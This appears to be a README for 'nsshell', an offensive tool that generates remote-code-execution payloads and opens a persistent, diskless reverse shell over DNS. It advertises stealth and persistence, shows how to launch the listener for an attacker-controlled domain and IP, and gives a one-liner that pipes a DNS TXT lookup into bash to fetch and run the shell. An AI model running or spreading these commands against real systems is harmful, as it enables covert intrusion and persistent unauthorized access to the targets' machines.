Think sqlmap meets xsshunter - but looking for (blind/nonblind) RCE to get a DNS connectback shell. 

> persistent shell (even if you exit nsshell.py)
> doesn't touch disk
> resumes access when you restart nsshell.py
> nothing to install or compile for the target
> the target can use their own trusted DNS resolver - or automatically upgrade to a direct connection for speed

Start:
The tool needs to know which domain it has control over:
sudo ./nsshell.py hack.com 123.123.123.112
...
>wrote connect-back payloads to:payloads.txt"

The file above contains a list of auto-pwns. Run one of the payloads and a persistent shell will be loaded over DNS.

That's all folks!

## install
sudo make install && echo $(which nsshell) && nsshell localhost 127.0.0.1

spawn a connectback:
nslookup -type=txt 1 localhost | bash
